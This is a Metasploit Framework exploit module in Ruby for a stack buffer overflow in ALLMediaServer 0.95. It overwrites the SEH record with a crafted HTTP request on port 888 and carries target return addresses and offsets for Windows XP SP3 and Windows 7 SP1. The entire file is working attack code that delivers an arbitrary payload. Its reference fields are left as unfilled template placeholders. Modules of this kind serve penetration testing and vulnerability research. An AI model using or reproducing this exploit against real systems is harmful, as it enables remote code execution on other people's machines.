# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;ALLMediaServer 0.95 Buffer Overflow Exploit&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a stack buffer overflow in ALLMediaServer 0.95. The vulnerability
          is caused due to a boundary error within the handling of HTTP request.
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;metacom<metacom27[at]gmail.com>&#039;,  # Original discovery
          &#039;<metacom>&#039;,  # MSF Module
          &#039;Romanian Security Team - RST&#039;,
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;<insert OSVDB number here>&#039; ],
          [ &#039;CVE&#039;, &#039;insert CVE number here&#039; ],
          [ &#039;URL&#039;, &#039;insert another link to the exploit/advisory here&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;, #none/process/thread/seh
          #&#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;  =>
        {
          &#039;BadChars&#039; => "\x00", # <change if needed>
          &#039;DisableNops&#039; => true,
        },

      &#039;Targets&#039;    =>
        [
          [ &#039;ALLMediaServer 0.95 / Windows XP SP3 / Windows 7 SP1&#039;,
            {
              &#039;Ret&#039;     =>  0x0042173c, # pop eax # pop ebx # ret  - MediaServer.exe
              &#039;Offset&#039;  =>  1065
            }
          ],
        
        
      [ &#039;ALLMediaServer 0.95 / Windows XP SP3&#039;, # Windows XP SP3 - English&#039;
       {
        &#039;Ret&#039;     =>  0x006f0854, # pop ecx # pop ebp # ret  - MediaServer.exe
        &#039;Offset&#039;  =>  1065
       }
      ],
    ],
      &#039;Privileged&#039;  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      &#039;DisclosureDate&#039;  => &#039;Aug 21 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(888)], self.class)

  end

  def exploit


    connect
    buffer = "http://"
    buffer << rand_text(target[&#039;Offset&#039;])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  #3931 bytes of space
    # more junk may be needed to trigger the exception

    print_status("Sending payload to ALLMediaServer on #{target.name}...")
    sock.put(buffer)

    handler
    disconnect

  end
end

